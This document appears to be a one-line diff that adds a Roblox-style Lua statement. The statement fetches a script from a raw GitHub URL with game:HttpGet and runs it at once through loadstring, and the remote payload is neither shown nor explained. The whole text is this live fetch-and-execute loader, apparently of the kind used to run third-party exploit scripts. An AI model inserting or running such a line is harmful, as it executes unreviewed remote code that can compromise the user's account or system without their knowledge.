@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/juraganzenx/MARKET1/refs/heads/main/MAIN", true))()
